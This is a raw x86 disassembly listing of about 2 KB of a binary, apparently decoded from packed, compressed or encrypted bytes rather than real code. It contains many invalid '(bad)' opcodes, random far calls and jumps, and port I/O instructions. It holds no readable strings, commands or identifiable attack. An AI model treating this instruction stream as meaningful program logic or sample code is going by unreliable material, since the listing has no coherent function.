  414437:	jge    0x4144a3
  414439:	jp     0x41442a
  41443b:	inc    esi
  41443c:	div    DWORD PTR [edi+0x38c9d24a]
  414442:	mov    al,BYTE PTR [ebx]
  414444:	sbb    DWORD PTR [edi],edi
  414446:	push   ebx
  414447:	add    BYTE PTR ds:0xc37c2d74,dh
  41444d:	loop   0x4144a8
  41444f:	(bad)  
  414450:	cwde   
  414451:	mov    eax,ds:0x121912d4
  414456:	xor    edx,DWORD PTR [esi+0x40]
  414459:	aas    
  41445a:	jp     0x414431
  41445c:	call   0x40fd:0xc7b9058c
  414463:	ffreep st(4)
  414465:	es mov ah,0x3d
  414468:	mov    ecx,0x6570723b
  41446d:	mov    dh,0x5b
  41446f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414470:	jle    0x41445b
  414472:	(bad)  
  414473:	test   dl,0x71
  414476:	mov    DWORD PTR [edi-0x3598c101],ebp
  41447c:	pop    ss
  41447d:	outs   dx,BYTE PTR ds:[esi]
  41447e:	test   al,0xd4
  414480:	xchg   edx,edi
  414482:	nop
  414483:	pop    ecx
  414484:	xchg   esi,eax
  414485:	lods   eax,DWORD PTR ds:[esi]
  414486:	scas   eax,DWORD PTR es:[edi]
  414487:	retf   0xd3de
  41448a:	mov    bl,0x46
  41448c:	adc    BYTE PTR [esi-0x7606d446],0x50
  414493:	das    
  414494:	aaa    
  414495:	test   al,0x21
  414497:	stc    
  414498:	lods   eax,DWORD PTR ds:[esi]
  414499:	jg     0x414438
  41449b:	scas   al,BYTE PTR es:[edi]
  41449c:	aaa    
  41449d:	in     al,dx
  41449e:	cdq    
  41449f:	sbb    DWORD PTR [edi+eiz*1-0x483a8d79],0x66a9c9cb
  4144aa:	data16 rcl BYTE PTR [ecx-0x1b1822dc],cl
  4144b1:	std    
  4144b2:	(bad)  
  4144b3:	in     al,0x53
  4144b5:	and    al,bl
  4144b7:	jp     0x414505
  4144b9:	push   esp
  4144ba:	mov    ecx,0x56888405
  4144bf:	jecxz  0x4144a2
  4144c1:	dec    si
  4144c3:	dec    edi
  4144c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144c5:	cli    
  4144c6:	xor    edi,DWORD PTR [esi-0x7275e88d]
  4144cc:	out    dx,eax
  4144cd:	push   0xb0934e90
  4144d2:	cmp    ah,bl
  4144d4:	test   BYTE PTR [eax],al
  4144d6:	sbb    BYTE PTR [ebx-0x6fb3d7c0],0x73
  4144dd:	je     0x4144f7
  4144df:	addr16 mov eax,0xc0a46da7
  4144e5:	mov    ebp,0x23fa09fb
  4144ea:	ja     0x41451f
  4144ec:	mov    ah,0xa5
  4144ee:	jge    0x4144b8
  4144f0:	test   al,0xff
  4144f2:	fist   WORD PTR [edx]
  4144f4:	pop    ds
  4144f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144f6:	cmp    bh,ch
  4144f8:	out    0x47,eax
  4144fa:	imul   ecx,DWORD PTR [esi-0x9],0xd41e8fac
  414501:	and    dl,ch
  414503:	ror    BYTE PTR [eax],0x9b
  414506:	icebp  
  414507:	out    0x8f,al
  414509:	retf   
  41450a:	arpl   WORD PTR [edi+0x5585f493],sp
  414510:	mov    es,WORD PTR [ecx]
  414512:	test   BYTE PTR [ebp-0x61d82be7],0x3d
  414519:	jg     0x41454c
  41451b:	cmp    eax,0x50cf3082
  414520:	sti    
  414521:	xchg   edi,eax
  414522:	loopne 0x414571
  414524:	or     ch,BYTE PTR [esi-0x3f94455]
  41452a:	pop    esi
  41452b:	sub    edi,DWORD PTR [ebx]
  41452d:	pminsw mm3,QWORD PTR [ecx-0x60]
  414531:	test   ch,0xc4
  414534:	xlat   BYTE PTR ds:[ebx]
  414535:	test   al,0xdf
  414537:	not    BYTE PTR [edx+0x4d92a8c]
  41453d:	mov    ebx,0xb4ef7961
  414542:	push   es
  414543:	enterw 0x4f47,0xa9
  414548:	mov    eax,ds:0xc4c2bd01
  41454d:	fcmovnb st,st(4)
  41454f:	push   ds
  414550:	mov    dh,0x46
  414552:	or     al,BYTE PTR cs:[ecx-0x33]
  414556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414557:	push   es
  414558:	lods   eax,DWORD PTR ds:[esi]
  414559:	or     al,0xa9
  41455b:	ins    BYTE PTR es:[edi],dx
  41455c:	mov    edi,0x66a35dbb
  414561:	mov    ebp,0xa34d94f3
  414566:	popf   
  414567:	adc    BYTE PTR [eax-0x7eb7b13],dl
  41456d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41456e:	outs   dx,DWORD PTR ds:[esi]
  41456f:	sahf   
  414570:	inc    edx
  414571:	adc    al,0xd1
  414573:	sahf   
  414574:	test   al,0xec
  414576:	inc    ecx
  414577:	xchg   esp,eax
  414578:	fcmovb st,st(5)
  41457a:	in     al,0xdf
  41457c:	pop    edx
  41457d:	add    eax,DWORD PTR [ebp+0x7d]
  414580:	pop    ebx
  414581:	jae    0x414546
  414583:	call   0x2950:0xb69c1a08
  41458a:	cmp    edx,esi
  41458c:	jl     0x414564
  41458e:	jmp    0x7b1f8ca9
  414593:	ret    0x4467
  414596:	sbb    al,BYTE PTR cs:[eax+0x69]
  41459a:	inc    ebx
  41459b:	into   
  41459c:	pop    ecx
  41459d:	and    ch,BYTE PTR [esi-0x16]
  4145a0:	sbb    eax,0x791bb1ac
  4145a5:	loop   0x4145b2
  4145a7:	popa   
  4145a8:	mov    ch,0x5b
  4145aa:	repz xchg edi,eax
  4145ac:	dec    esp
  4145ad:	shl    cl,1
  4145af:	lods   eax,DWORD PTR ds:[esi]
  4145b0:	mov    ebx,0xdccb7bb
  4145b5:	xchg   edi,eax
  4145b6:	loopne 0x4145a7
  4145b8:	retf   
  4145b9:	cs daa 
  4145bb:	int3   
  4145bc:	arpl   WORD PTR [ebp+0x30],si
  4145bf:	lods   al,BYTE PTR ds:[esi]
  4145c0:	aas    
  4145c1:	push   ecx
  4145c2:	loop   0x41462b
  4145c4:	sub    al,BYTE PTR [eax]
  4145c6:	lods   al,BYTE PTR ds:[esi]
  4145c7:	mov    edi,0xcd74adea
  4145cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145cd:	lods   eax,DWORD PTR ds:[esi]
  4145ce:	cmp    al,0xd3
  4145d0:	and    eax,0x8653e05
  4145d5:	aad    0x5
  4145d7:	icebp  
  4145d8:	push   cs
  4145d9:	xchg   edx,eax
  4145da:	lock data16 out 0x8d,al
  4145de:	rol    ebx,cl
  4145e0:	data16 sahf 
  4145e2:	inc    esi
  4145e3:	scas   al,BYTE PTR es:[edi]
  4145e4:	adc    eax,0x49e5dad8
  4145e9:	sbb    BYTE PTR [ebx+0x29d544d2],ch
  4145ef:	sub    eax,0xedbc9943
  4145f4:	fs popf 
  4145f6:	sbb    esi,DWORD PTR [eax+0x67caf860]
  4145fc:	jmp    0x34e3:0x4cede32f
  414603:	add    esp,DWORD PTR [ecx+0x34]
  414606:	and    DWORD PTR [edi+0x1de7fdc],ecx
  41460c:	and    DWORD PTR [edx],0xffffff83
  41460f:	retf   0x9816
  414612:	in     al,0x63
  414614:	stos   DWORD PTR es:[edi],eax
  414615:	test   al,0x69
  414617:	retf   0x5bf
  41461a:	loop   0x4145e2
  41461c:	cld    
  41461d:	cmp    BYTE PTR [esp+eiz*8],dh
  414620:	mov    BYTE PTR [edi-0x78],bh
  414623:	push   0xf7dc681d
  414628:	dec    edi
  414629:	fisubr DWORD PTR [ebx+eiz*4-0x27769250]
  414630:	int    0xae
  414632:	rol    BYTE PTR [edi],cl
  414634:	out    dx,al
  414635:	adc    al,0xdd
  414637:	mov    ah,0x9a
  414639:	mov    esp,0x4f9c8380
  41463e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41463f:	rol    DWORD PTR [edx+0x28da2cba],cl
  414645:	push   0x58e12e50
  41464a:	sbb    esi,ecx
  41464c:	push   eax
  41464d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41464e:	mov    ds:0x2a0d1e87,eax
  414653:	inc    edi
  414654:	je     0x41469d
  414656:	cmp    dh,BYTE PTR [esi+0x41ce0a7]
  41465c:	or     eax,edi
  41465e:	sbb    DWORD PTR [ebx-0x3ff46670],0x72
  414665:	or     eax,0xa0e9696b
  41466a:	inc    ecx
  41466b:	mov    DWORD PTR [ebp+0x1e],edi
  41466e:	push   ebp
  41466f:	push   0xffffff84
  414671:	mov    esi,0x4d65fcb
  414676:	les    ecx,FWORD PTR [ecx]
  414678:	aam    0x1c
  41467a:	push   edi
  41467b:	mov    ah,0xf0
  41467d:	imul   ebp,DWORD PTR ds:[ebx],0x29
  414681:	push   eax
  414682:	xor    DWORD PTR [ebp-0x2d12e430],esi
  414688:	mov    dh,0x0
  41468a:	(bad)
  41468f:	adc    al,0xe1
  414691:	xchg   ecx,eax
  414692:	xchg   DWORD PTR [eax-0xf9eda06],esi
  414698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414699:	and    al,0xbc
  41469b:	xor    DWORD PTR [eax+ebp*1-0x69],eax
  41469f:	mov    esi,0x37ca9ed2
  4146a4:	mov    edi,0x2b366061
  4146a9:	(bad)  
  4146aa:	call   0x9bd7472
  4146af:	into   
  4146b0:	inc    esi
  4146b1:	inc    esp
  4146b2:	sub    al,BYTE PTR [eax]
  4146b4:	cmp    BYTE PTR [ebx],al
  4146b6:	cld    
  4146b7:	dec    ecx
  4146b8:	push   0xffffffcc
  4146ba:	test   BYTE PTR [ecx-0x42],dl
  4146bd:	sbb    al,0xbd
  4146bf:	shl    esi,cl
  4146c1:	fild   QWORD PTR [edi+0x7cb02ce6]
  4146c7:	or     eax,0x82df4742
  4146cc:	add    DWORD PTR [ecx],edx
  4146ce:	xchg   ecx,eax
  4146cf:	call   0xe4259f58
  4146d4:	or     eax,0xfa46c4c
  4146d9:	jle    0x41466c
  4146db:	sbb    DWORD PTR [eax],0xf8fca06
  4146e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146e2:	push   es
  4146e3:	inc    edx
  4146e4:	mov    es,WORD PTR [edx+edx*8]
  4146e7:	fist   WORD PTR [ebx-0x71]
  4146ea:	mov    DWORD PTR [esi],esp
  4146ec:	add    DWORD PTR [esi+0x5],0x7e3d6552
  4146f3:	das    
  4146f4:	inc    ecx
  4146f5:	add    al,0x56
  4146f7:	sub    esp,DWORD PTR [edx-0x45fb5efe]
  4146fd:	inc    ebx
  4146fe:	int3   
  4146ff:	jl     0x41470c
  414701:	rcl    DWORD PTR ds:0xfca78f1,1
  414707:	ror    eax,1
  414709:	cmp    al,0xcc
  41470b:	into   
  41470c:	xor    dh,dl
  41470e:	scas   eax,DWORD PTR es:[edi]
  41470f:	cdq    
  414710:	xor    DWORD PTR [eax-0x1c],ebp
  414713:	ror    BYTE PTR [ebp-0x69302a48],cl
  414719:	pop    esp
  41471a:	and    BYTE PTR ds:0x5ac996c6,al
  414720:	add    cl,BYTE PTR [ebp+0x60a39faa]
  414726:	sub    BYTE PTR [edx+0x5701b7c1],al
  41472c:	adc    BYTE PTR [ebp+0x5fb2a366],0x70
  414733:	jle    0x4146fe
  414735:	cmp    al,al
  414737:	cli    
  414738:	dec    edi
  414739:	in     al,dx
  41473a:	shl    edx,1
  41473c:	mov    bh,0x73
  41473e:	sub    eax,0x7cf1740d
  414743:	inc    ebx
  414744:	test   eax,0x7df9db11
  414749:	inc    edx
  41474a:	ret    0x90b0
  41474d:	jbe    0x414775
  41474f:	icebp  
  414750:	sti    
  414751:	repnz lahf 
  414753:	jg     0x414718
  414755:	jb     0x4147a3
  414757:	xchg   ebp,eax
  414758:	xchg   edi,eax
  414759:	sub    DWORD PTR [ebx-0x351764c6],ebx
  41475f:	gs or  al,0x4a
  414762:	pop    ecx
  414763:	cs and ebx,edi
  414766:	mov    cl,0x80
  414768:	sub    BYTE PTR [esi+edi*1],dl
  41476b:	adc    eax,0xfab483fb
  414770:	out    dx,al
  414771:	je     0x4147e2
  414773:	jno    0x41476f
  414775:	in     al,0xab
  414777:	add    bh,BYTE PTR [eax]
  414779:	mov    ds:0x64bf4ae,eax
  41477e:	mov    eax,ds:0x4eb6083a
  414783:	adc    eax,0xc0f5f985
  414788:	sahf   
  414789:	or     eax,0x43633905
  41478e:	sub    bl,BYTE PTR [edi+0x30104b34]
  414794:	sbb    BYTE PTR [esi-0x67],ch
  414797:	cmp    edi,edx
  414799:	and    edi,DWORD PTR [esi-0x45651def]
  41479f:	add    eax,0x222dc121
  4147a4:	jmp    0x1552:0x2e9ec5a2
  4147ab:	xchg   ecx,eax
  4147ac:	neg    bl
  4147ae:	int    0xc2
  4147b0:	mov    DWORD PTR [ebp+0x5e],ebp
  4147b3:	jo     0x4147f1
  4147b5:	pop    ebp
  4147b6:	clc    
  4147b7:	mov    ecx,0xcbd2b7ba
  4147bc:	iret   
  4147bd:	mov    ebp,fs
  4147bf:	push   ebx
  4147c0:	adc    DWORD PTR ds:0x3bd259a1,edi
  4147c6:	push   ss
  4147c7:	fisubr WORD PTR [edi+eiz*1-0x330e03b7]
  4147ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147cf:	in     eax,0x1c
  4147d1:	or     DWORD PTR [edx+0x77143697],esp
  4147d7:	mov    bh,0xb5
  4147d9:	pushf  
  4147da:	jmp    0xab020fcf
  4147df:	dec    esp
  4147e0:	mov    ecx,0x252ee5af
  4147e5:	mov    bh,0x9b
  4147e7:	inc    ecx
  4147e8:	mov    al,ds:0x30b78992
  4147ed:	mov    ?,WORD PTR [edi+eiz*8-0x26]
  4147f1:	mov    al,0xd9
  4147f3:	cmp    bh,bl
  4147f5:	jmp    0x414826
  4147f7:	pusha  
  4147f8:	fs in  eax,dx
  4147fa:	lds    ebx,FWORD PTR [edi+0x739db970]
  414800:	sbb    DWORD PTR gs:[edi-0x60],0xa2dd7c3
  414808:	jl     0x414837
  41480a:	not    bh
  41480c:	sahf   
  41480d:	push   edx
  41480e:	pop    eax
  41480f:	scas   eax,DWORD PTR es:[edi]
  414810:	icebp  
  414811:	(bad)  
  414812:	pop    edx
  414813:	cmp    edx,edx
  414815:	mov    al,0x5
  414817:	jl     0x414876
  414819:	jo     0x414816
  41481b:	mov    edx,0x7c793d84
  414820:	out    dx,eax
  414821:	and    DWORD PTR [esi-0x366f043c],ebp
  414827:	xchg   BYTE PTR [esi*2+0x1558fae9],cl
  41482e:	mov    fs,WORD PTR [edi-0x24cf73a0]
  414834:	push   ebp
  414835:	add    BYTE PTR [ebp+0x0],ch
  414838:	stc    
  414839:	popf   
  41483a:	stos   BYTE PTR es:[edi],al
  41483b:	adc    DWORD PTR [ebx+0x105eb643],0x2f
  414842:	fbstp  TBYTE PTR [edi+eiz*1]
  414845:	in     al,0x55
  414847:	xor    BYTE PTR [esi-0x6a],cl
  41484a:	and    ebx,edx
  41484c:	imul   edi,ecx,0x73
  41484f:	repnz mov dh,0xd6
  414852:	int    0xc1
  414854:	xchg   esi,eax
  414855:	leave  
  414856:	(bad)  
  414857:	and    eax,0xc12e511
  41485c:	(bad)  
  41485d:	or     eax,DWORD PTR [ecx+0x50]
  414860:	cdq    
  414861:	inc    esi
  414862:	aas    
  414863:	cli    
  414864:	imul   ebx
  414866:	push   edx
  414867:	mov    ?,WORD PTR [esi-0x60]
  41486a:	sbb    eax,0xf7032617
  41486f:	inc    esp
  414870:	jp     0x41484f
  414872:	sub    bl,BYTE PTR [eax]
  414874:	or     esi,eax
  414876:	mov    esp,0x84f6fa9c
  41487b:	ja     0x41482e
  41487d:	aaa    
  41487e:	or     eax,0x56027e7e
  414883:	pop    eax
  414884:	aaa    
  414885:	call   0x4de4:0x2dabe113
  41488c:	jbe    0x4148fb
  41488e:	lock mov ds:0xd20f25c2,al
  414894:	std    
  414895:	jnp    0x41481f
  414897:	and    DWORD PTR [eax-0x22],edx
  41489a:	sbb    DWORD PTR [eax+ecx*8],eax
  41489d:	cs jbe 0x41489a
  4148a0:	jns    0x4148ca
  4148a2:	xor    BYTE PTR [eax-0x75],dh
  4148a5:	jg     0x4148be
  4148a7:	stc    
  4148a8:	push   DWORD PTR [eax]
  4148aa:	(bad)  
  4148ab:	xchg   BYTE PTR [edi-0x716f435c],al
  4148b1:	jp     0x414868
  4148b3:	fstp   DWORD PTR [edx-0x5b]
  4148b6:	jg     0x4148de
  4148b8:	jae    0x414875
  4148ba:	xor    DWORD PTR [ecx+ebx*1],ecx
  4148bd:	jge    0x41493e
  4148bf:	mov    dl,0xf4
  4148c1:	mov    dh,0xdb
  4148c3:	cwde   
  4148c4:	inc    ebx
  4148c5:	xor    DWORD PTR [edi],edi
  4148c7:	fstp   DWORD PTR ds:0x5f81dcb8
  4148cd:	stos   BYTE PTR es:[edi],al
  4148ce:	in     al,0x19
  4148d0:	add    DWORD PTR [eax],ebx
  4148d2:	inc    edi
  4148d3:	add    BYTE PTR [esi+eax*8+0x53c9f93f],bl
  4148da:	xchg   esp,eax
  4148db:	dec    edi
  4148dc:	stos   DWORD PTR es:[edi],eax
  4148dd:	sbb    al,0x26
  4148df:	je     0x41489c
  4148e1:	pop    esp
  4148e2:	inc    edi
  4148e3:	mov    gs,WORD PTR [ecx]
  4148e5:	inc    ebp
  4148e6:	add    eax,0x732d7b67
  4148eb:	popa   
  4148ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ed:	xor    DWORD PTR [ebp+0x3dbe2ca0],esi
  4148f3:	cmc    
  4148f4:	inc    esp
  4148f5:	push   es
  4148f6:	int    0x92
  4148f8:	fldenv [eax-0x15042f33]
  4148fe:	icebp  
  4148ff:	ss jmp 0xd1d7:0xd3b92b60
  414907:	ret    0xba27
  41490a:	lahf   
  41490b:	xor    al,0x39
  41490d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41490f:	sub    BYTE PTR ss:[esi-0x3e560730],ch
  414916:	dec    esi
  414917:	cwde   
  414918:	inc    ebp
  414919:	popa   
  41491a:	imul   ecx,edi,0xffffff92
  41491d:	or     dl,0x8c
  414920:	and    DWORD PTR [eax+0x70acdff7],esi
  414926:	loope  0x41499d
  414928:	dec    ebp
  414929:	es push edi
  41492b:	lea    esp,[ebx]
  41492d:	ret    
  41492e:	sbb    BYTE PTR [eax+ebp*2-0x45],cl
  414932:	es fcmovnu st,st(5)
  414935:	lahf   
  414936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414937:	or     al,0x1e
  414939:	or     BYTE PTR [edx],cl
  41493b:	inc    esp
  41493c:	add    eax,0xbae076d8
  414941:	xchg   edi,eax
  414942:	and    BYTE PTR [ebp+0x41],bl
  414945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414946:	mov    dh,0xb3
  414948:	xor    BYTE PTR [eax],0xa
  41494b:	cdq    
  41494c:	dec    ebp
  41494d:	add    eax,0x3777653
  414952:	jmp    0xd9ce983a
  414957:	and    bh,BYTE PTR [edx+0x3182ad00]
  41495d:	ret    
  41495e:	fldcw  WORD PTR ds:[eax+0x5b]
  414962:	fwait
  414963:	jle    0x414902
  414965:	retf   
  414966:	es cs inc edi
  414969:	loop   0x41491a
  41496b:	shl    BYTE PTR [edx+0x7fb9a054],cl
  414971:	in     eax,0x75
  414973:	lods   al,BYTE PTR ds:[esi]
  414974:	pushf  
  414975:	sbb    eax,0x50631790
  41497a:	pusha  
  41497b:	outs   dx,DWORD PTR ds:[esi]
  41497c:	xor    BYTE PTR [edx+ebp*4-0x4145143],ch
  414983:	icebp  
  414984:	aas    
  414985:	mov    ah,0x3f
  414987:	mov    cl,0x61
  414989:	ins    BYTE PTR es:[edi],dx
  41498a:	fist   WORD PTR [ebp-0x29]
  41498d:	je     0x414935
  41498f:	mov    edi,0xc2cb7c99
  414994:	and    DWORD PTR ds:0xe77e39fe,0xcc1cbb58
  41499e:	push   ebx
  41499f:	pop    edi
  4149a0:	(bad)  
  4149a1:	sti    
  4149a2:	mov    bh,0x18
  4149a4:	inc    eax
  4149a5:	sbb    edx,DWORD PTR [esi+ecx*4+0x24b574f3]
  4149ac:	mov    cl,0x93
  4149ae:	clc    
  4149af:	iret   
  4149b0:	outs   dx,DWORD PTR ds:[esi]
  4149b1:	ja     0x414a2a
  4149b3:	inc    ebx
  4149b4:	clc    
  4149b5:	bound  eax,QWORD PTR [edi]
  4149b7:	push   ecx
  4149b8:	jns    0x41496d
  4149ba:	pusha  
  4149bb:	pop    ss
  4149bc:	xlat   BYTE PTR ds:[ebx]
  4149bd:	jbe    0x414a16
  4149bf:	jne    0x4149b1
  4149c1:	ret    0x769
  4149c4:	xchg   ecx,eax
  4149c5:	fcmovne st,st(0)
  4149c7:	dec    esp
  4149c8:	sti    
  4149c9:	mov    dh,0x98
  4149cb:	pop    ds
  4149cc:	pusha  
  4149cd:	ja     0x4149bb
  4149cf:	ror    BYTE PTR [ebp-0x4bd4f2ad],0xb
  4149d6:	(bad)  
  4149d7:	out    dx,eax
  4149d8:	jge    0x4149f3
  4149da:	add    esp,DWORD PTR [edi+0x10]
  4149dd:	js     0x4149f0
  4149df:	xadd   BYTE PTR [edx+0x4f],al
  4149e3:	fdivp  st(4),st
  4149e5:	sub    dh,al
  4149e7:	add    al,0x25
  4149e9:	test   edx,esp
  4149eb:	jl     0x414a69
  4149ed:	xor    al,0xd
  4149ef:	add    DWORD PTR fs:[ecx-0x7b919cfc],0x70293fce
  4149fa:	es aas 
  4149fc:	imul   esi,DWORD PTR [eax],0x10
  4149ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a00:	mov    edi,0xe71985d8
  414a05:	sub    ecx,edi
  414a07:	sbb    al,0xb3
  414a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a0a:	jmp    0x9c6342a5
  414a0f:	and    al,0xa4
  414a11:	in     al,0xe7
  414a13:	ins    BYTE PTR es:[edi],dx
  414a14:	pop    ebx
  414a15:	stc    
  414a16:	std    
  414a17:	aam    0x46
  414a19:	call   0x956f:0x7dc43c99
  414a20:	neg    DWORD PTR [ecx]
  414a22:	add    al,0x22
  414a24:	inc    eax
  414a25:	por    mm6,mm5
  414a28:	pop    ss
  414a29:	sub    BYTE PTR [ebp-0x1c],cl
  414a2c:	xchg   ebx,eax
  414a2d:	out    dx,al
  414a2e:	push   ecx
  414a2f:	pop    eax
  414a30:	rcr    BYTE PTR [edi+0x76],0xd8
  414a34:	dec    esp
  414a35:	adc    eax,0x9b9752f8
  414a3a:	jno    0x414a29
  414a3c:	fwait
  414a3d:	repnz call 0xfefa:0xe11eed2f
  414a45:	jbe    0x414a47
  414a47:	sbb    al,0x10
  414a49:	pop    ecx
  414a4a:	jge    0x4149cf
  414a4c:	push   ss
  414a4d:	push   ebp
  414a4e:	sbb    dl,BYTE PTR ds:0x50576597
  414a54:	das    
  414a55:	xchg   esi,eax
  414a56:	jg     0x414a16
  414a58:	loope  0x414a9b
  414a5a:	dec    edx
  414a5b:	sbb    DWORD PTR [esi],esi
  414a5d:	je     0x414ac0
  414a5f:	retf   
  414a60:	icebp  
  414a61:	loop   0x414a2b
  414a63:	dec    edx
  414a64:	imul   DWORD PTR [ebx-0x20ed1ba1]
  414a6a:	adc    ch,BYTE PTR [edi-0x4b1a10b7]
  414a70:	sub    DWORD PTR [ebx],ecx
  414a72:	(bad)  
  414a73:	cli    
  414a74:	cli    
  414a75:	lds    esi,FWORD PTR [ebx-0x320af131]
  414a7b:	in     al,dx
  414a7c:	call   0x3ced:0x39cc235c
  414a83:	adc    BYTE PTR [esi+0xb],al
  414a86:	ins    BYTE PTR es:[edi],dx
  414a87:	jnp    0x414aba
  414a89:	retf   
  414a8a:	adc    BYTE PTR [esi+0x3d],ch
  414a8d:	js     0x414b01
  414a8f:	lea    esp,[ebx]
  414a91:	cmp    DWORD PTR [ebx-0x285c402f],esp
  414a97:	xchg   ebp,eax
  414a98:	pushf  
  414a99:	add    DWORD PTR [eiz*4-0x6689a33b],esp
  414aa0:	lds    ecx,FWORD PTR [ecx+0x11]
  414aa3:	xchg   ecx,eax
  414aa4:	cmp    BYTE PTR [ecx+0x26c89c82],ah
  414aaa:	hlt    
  414aab:	in     al,dx
  414aac:	sbb    esi,DWORD PTR [eax+0x1f854b09]
  414ab2:	jb     0x414af2
  414ab4:	jmp    0x2318f12d
  414ab9:	das    
  414aba:	repnz adc eax,0xe46c2cf
  414ac0:	xchg   esp,eax
  414ac1:	xchg   esp,eax
  414ac2:	out    dx,al
  414ac3:	or     al,al
  414ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ac6:	mov    ecx,0x2d999a3c
  414acb:	pop    edi
  414acc:	sbb    DWORD PTR [edi-0x75],edi
  414acf:	pop    esp
  414ad0:	xlat   BYTE PTR ds:[ebx]
  414ad1:	js     0x414a9f
  414ad3:	mov    bl,0x8
  414ad5:	jmp    0x414a7b
  414ad7:	ds aas 
  414ad9:	adc    eax,0x5b52db92
  414ade:	jge    0x414b5b
  414ae0:	cmp    ecx,edi
  414ae2:	stos   DWORD PTR es:[edi],eax
  414ae3:	retf   
  414ae4:	pop    ebp
  414ae5:	jl     0x414a84
  414ae7:	mov    edx,0x1335d0cd
  414aec:	retf   0x726
  414aef:	int    0xd6
  414af1:	mov    ch,0x84
  414af3:	fistp  DWORD PTR [edi]
  414af5:	fdiv   DWORD PTR [edx+0x1b]
  414af8:	jecxz  0x414af8
  414afa:	adc    BYTE PTR [ebx+0x77],bl
  414afd:	push   ecx
  414afe:	lahf   
  414aff:	xchg   esi,eax
  414b00:	push   es
  414b01:	adc    eax,0xf552044f
  414b06:	lock ins DWORD PTR es:[edi],dx
  414b08:	int    0x4f
  414b0a:	iret   
  414b0b:	sbb    dh,BYTE PTR [eax-0x43692c87]
  414b11:	sar    esi,1
  414b13:	jno    0x414b65
  414b15:	inc    eax
  414b16:	or     DWORD PTR [ebx-0x65],edi
  414b19:	loopne 0x414aaf
  414b1b:	dec    ecx
  414b1c:	pop    eax
  414b1d:	push   edx
  414b1e:	pop    ds
  414b1f:	fst    DWORD PTR [edx-0x58]
  414b22:	popa   
  414b23:	xchg   esi,eax
  414b24:	cli    
  414b25:	mov    bl,0x1c
  414b27:	test   DWORD PTR ds:[esi+0x16726232],0x63037995
  414b32:	icebp  
  414b33:	imul   esi,DWORD PTR [ebx+0x3c523f8f],0xffffffbf
  414b3a:	xchg   ecx,eax
  414b3b:	imul   edx,DWORD PTR [ebp-0x58beb56b],0x44
  414b42:	sbb    al,0xcf
  414b44:	mov    ecx,0xc8a483d3
  414b49:	mov    ecx,DWORD PTR [edi+0x5b0b40c0]
  414b4f:	push   ds
  414b50:	(bad)  
  414b51:	call   FWORD PTR [edx-0x3672ee1b]
  414b57:	repnz cmp DWORD PTR [eax-0x5f6ec420],eax
  414b5e:	test   DWORD PTR [esi-0x7a],ebx
  414b61:	lods   al,BYTE PTR ds:[esi]
  414b62:	and    dl,ah
  414b64:	jle    0x414b6b
  414b66:	dec    eax
  414b67:	pop    edx
  414b68:	push   es
  414b69:	arpl   WORD PTR [esi+0x63],dx
  414b6c:	cs std 
  414b6e:	scas   al,BYTE PTR es:[edi]
  414b6f:	call   0x594a8be6
  414b74:	ss (bad) 
  414b76:	pop    ebp
  414b77:	push   ecx
  414b78:	into   
  414b79:	call   0x3765cc7b
  414b7e:	rcl    DWORD PTR [edx+0x41],cl
  414b81:	out    dx,al
  414b82:	mov    ebp,0xc553622c
  414b87:	loope  0x414bd8
  414b89:	pushf  
  414b8a:	popf   
  414b8b:	mov    bl,0x2f
  414b8d:	and    BYTE PTR [ebp-0x44408f3e],dh
  414b93:	cmp    al,0xa9
  414b95:	mov    esp,0xa8aca9f2
  414b9a:	lds    eax,FWORD PTR [ebp-0x26]
  414b9d:	add    esp,DWORD PTR [eax]
  414b9f:	sub    eax,0x3dde691e
  414ba4:	(bad)  
  414ba5:	pop    edi
  414ba6:	and    al,0xf8
  414ba8:	dec    edi
  414ba9:	lock popf 
  414bab:	push   es
  414bac:	and    ebx,DWORD PTR [edi+edx*1]
  414baf:	mov    ds,WORD PTR [ecx-0x25]
  414bb2:	xor    eax,0xa3e7060b
  414bb7:	sbb    eax,0x567c699e
  414bbc:	jae    0x414bec
  414bbe:	push   edx
  414bbf:	repz xor BYTE PTR [ebx-0x26],al
  414bc3:	sbb    dh,BYTE PTR [eax+0x46196b05]
  414bc9:	imul   ecx,DWORD PTR [eax+0x3d],0x867d60b7
  414bd0:	loope  0x414bc7
  414bd2:	out    dx,eax
  414bd3:	jo     0x414b94
  414bd5:	fisttp DWORD PTR [ebx]
  414bd7:	or     esi,DWORD PTR [eax+0x182ac388]
  414bdd:	cmp    al,bl
  414bdf:	mov    dl,0x31
  414be1:	adc    bl,0x44
  414be4:	dec    eax
  414be5:	fwait
  414be6:	lods   al,BYTE PTR ds:[esi]
  414be7:	aad    0x57
  414be9:	outs   dx,BYTE PTR ds:[esi]
  414bea:	sub    al,cl
  414bec:	arpl   bx,cx
  414bee:	mov    cl,0xa6
  414bf0:	xor    edx,DWORD PTR [edx]
  414bf2:	sub    eax,0x24005cd0
  414bf7:	stos   DWORD PTR es:[edi],eax
  414bf8:	test   BYTE PTR [ecx-0x77cba88b],0xa4
  414bff:	mov    ch,0x92
  414c01:	inc    ebx
  414c02:	fisubr DWORD PTR ds:0x50f26e10
  414c08:	popf   
  414c09:	sub    ch,BYTE PTR [edi+0x1be88a2f]
  414c0f:	mov    ecx,0x739853f8
  414c14:	pop    ebx
  414c15:	push   ds
  414c16:	mov    ds:0xbeca9197,eax
  414c1b:	mov    BYTE PTR [edx],ah
  414c1d:	int    0x58
  414c1f:	xor    DWORD PTR [ecx-0x7b],ecx
